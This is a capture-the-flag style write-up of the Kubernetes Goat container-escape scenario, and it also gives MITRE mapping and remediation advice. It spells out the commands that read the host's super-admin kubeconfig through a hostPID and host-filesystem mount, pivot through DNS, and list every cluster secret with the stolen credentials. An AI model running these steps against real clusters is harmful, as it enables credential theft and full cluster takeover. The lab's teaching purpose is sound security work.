# Scenario 4: Container Escape to Host System

## Overview
This challenge explores container escape techniques when a container is misconfigured with excessive privileges. A misconfigured "system-monitor" pod has access to host resources that allow an attacker to escape container isolation and gain full cluster access.

## Target
- **Pod**: `system-monitor`
- **Access**: Web terminal at http://127.0.0.1:1233/

## Setup

### Prerequisites
Install the `ws` npm package (one-time setup):
```bash
cd /workspaces/kubernetes-goat/scenario4
npm install ws
```

### Removing kubectl access (optional)
To simulate a realistic attacker scenario without cluster credentials:
```bash
mv ~/.kube/config ~/.kube/config.backup
```

To restore later:
```bash
mv ~/.kube/config.backup ~/.kube/config
```

## Usage

### Execute commands in the container
The `gotty_exec.js` script connects to the GoTTY web terminal via WebSocket:

```bash
# Basic usage
node scenario4/gotty_exec.js 'command'

# Examples
node scenario4/gotty_exec.js 'id'
node scenario4/gotty_exec.js 'cat /etc/os-release'
node scenario4/gotty_exec.js 'ls -la /'
node scenario4/gotty_exec.js 'mount'
```

### Alternative: Browser access
Open http://127.0.0.1:1233/ in your browser for an interactive terminal.

## Challenge Goal
Escape from the container to gain access to the underlying Kubernetes node (host system).

## Hints
Think about what makes a container "privileged" and what resources from the host might be accessible from inside the container.

---

## Walkthrough

### Step 1: Initial Reconnaissance

First, we verified our access to the container and checked what user we're running as:

```bash
node gotty_exec.js "whoami"
# Output: root
```

We're running as **root** inside the `system-monitor-deployment` pod.

### Step 2: Identifying Misconfigurations

#### Process Enumeration
We checked what processes are visible from inside the container:

```bash
node gotty_exec.js "ps aux"
```

**Finding**: The container could see ALL host processes, including:
- `kube-apiserver` - Kubernetes API server
- `etcd` - Kubernetes data store
- `kubelet` - Node agent
- `coredns`, `nginx`, `redis-server`, and other containerized applications

This indicates **`hostPID: true`** is set - the container shares the host's process namespace.

#### Mount Enumeration
We examined what filesystems are mounted:

```bash
node gotty_exec.js "cat /proc/mounts"
```

**Finding**: The host filesystem is mounted at `/host-system` with read-write access:
```
overlay /host-system overlay rw,relatime...
```

### Step 3: Locating Kubernetes Credentials

With access to the host filesystem, we explored where Kubernetes stores its configuration:

```bash
node gotty_exec.js "ls -la /host-system/etc/kubernetes/"
```

**Output**:
```
-rw------- root root  admin.conf
-rw------- root root  controller-manager.conf
-rw------- root root  kubelet.conf
drwxr-xr-x root root  manifests/
drwxr-xr-x root root  pki/
-rw------- root root  scheduler.conf
-rw------- root root  super-admin.conf
```

### Step 4: Extracting Super-Admin Credentials

We extracted the most privileged kubeconfig file:

```bash
node gotty_exec.js "cat /host-system/etc/kubernetes/super-admin.conf"
```

This file contains:
- **API Server URL**: `https://kubernetes-goat-cluster-control-plane:6443`
- **CA Certificate**: Base64-encoded cluster CA
- **Client Certificate + Key**: Authenticates as `kubernetes-super-admin`

The credentials were saved to `super-admin.conf` in this directory.

### Step 5: Network Pivot for API Access

The hostname `kubernetes-goat-cluster-control-plane` wasn't resolvable from outside the cluster. We used the compromised container as a pivot point to discover the internal IP:

```bash
node gotty_exec.js "getent hosts kubernetes-goat-cluster-control-plane"
# Output: fc00:f853:ccd:e793::2 kubernetes-goat-cluster-control-plane
```

Added this to `/etc/hosts` on our attacking machine:
```bash
echo "fc00:f853:ccd:e793::2 kubernetes-goat-cluster-control-plane" | sudo tee -a /etc/hosts
```

### Step 6: Full Cluster Compromise

With the stolen credentials, we gained super-admin access to the entire cluster:

```bash
kubectl --kubeconfig=super-admin.conf get nodes
# NAME                                    STATUS   ROLES           AGE   VERSION
# kubernetes-goat-cluster-control-plane   Ready    control-plane   ...   v1.34.0

kubectl --kubeconfig=super-admin.conf get secrets -A
# NAMESPACE      NAME              TYPE     DATA   AGE
# big-monolith   vaultapikey       Opaque   1      ...
# big-monolith   webhookapikey     Opaque   1      ...
# default        goatvault         Opaque   1      ...
```

## Attack Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Enumerate processes | Discovered `hostPID: true` |
| 2 | Check mounts | Found host filesystem at `/host-system` |
| 3 | Explore host filesystem | Located `/etc/kubernetes/` configs |
| 4 | Extract credentials | Obtained `super-admin.conf` |
| 5 | Network reconnaissance | Resolved internal control plane IP |
| 6 | Use stolen credentials | Full cluster admin access |

## Misconfigurations Exploited

| Misconfiguration | Risk | Description |
|-----------------|------|-------------|
| `hostPID: true` | High | Container sees all host processes |
| Host filesystem mount | Critical | Read/write access to node filesystem |
| Privileged credentials on node | Critical | Super-admin kubeconfig accessible |

## Impact

With super-admin cluster access, an attacker can:
- Read all secrets (API keys, passwords, tokens, TLS certs)
- Deploy malicious workloads (cryptominers, backdoors)
- Modify or delete any Kubernetes resource
- Pivot to other namespaces and compromise additional workloads
- Access the underlying cloud infrastructure via node credentials
- Establish persistence through multiple mechanisms

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | How It Was Used |
|--------------|----------------|-----------------|
| T1611 | Escape to Host | Used `hostPID` and host mount to escape container |
| T1552.001 | Credentials in Files | Extracted kubeconfig from `/etc/kubernetes/` |
| T1078.004 | Cloud Accounts | Used stolen super-admin credentials |
| T1046 | Network Service Discovery | Used compromised container to resolve internal DNS |
| T1083 | File and Directory Discovery | Enumerated host filesystem for credentials |

## Remediation

### Immediate Actions

1. **Remove `hostPID: true`** unless absolutely necessary:
   ```yaml
   spec:
     hostPID: false  # Default, but be explicit
   ```

2. **Remove host filesystem mounts**:
   ```yaml
   # Don't mount host paths like this:
   volumes:
     - name: host-fs
       hostPath:
         path: /
   ```

3. **Use read-only root filesystem**:
   ```yaml
   securityContext:
     readOnlyRootFilesystem: true
   ```

### Security Best Practices

1. **Pod Security Standards**: Enforce `restricted` policy
   ```yaml
   apiVersion: v1
   kind: Namespace
   metadata:
     labels:
       pod-security.kubernetes.io/enforce: restricted
   ```

2. **Use SecurityContext constraints**:
   ```yaml
   securityContext:
     runAsNonRoot: true
     runAsUser: 1000
     allowPrivilegeEscalation: false
     capabilities:
       drop: ["ALL"]
   ```

3. **Implement Network Policies** to restrict pod-to-API-server communication

4. **Rotate credentials** if compromise is suspected

5. **Use tools like Falco** to detect suspicious container behavior:
   - Reading sensitive files like `/etc/kubernetes/*`
   - Unexpected process execution
   - Container escape attempts

## Key Takeaways

1. **Defense in Depth**: Multiple misconfigurations chained together enabled full compromise
2. **Principle of Least Privilege**: Containers should never have more access than required
3. **Node Security Matters**: Host-level credentials must be protected from container access
4. **Network Segmentation**: Internal DNS and API access should be restricted

## References

- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [OWASP Kubernetes Top 10](https://owasp.org/www-project-kubernetes-top-ten/)
- [MITRE ATT&CK Containers Matrix](https://attack.mitre.org/matrices/enterprise/containers/)

---

## Credits

Writeup created with assistance from **Claude (Opus 4.5)** - Anthropic's AI assistant.
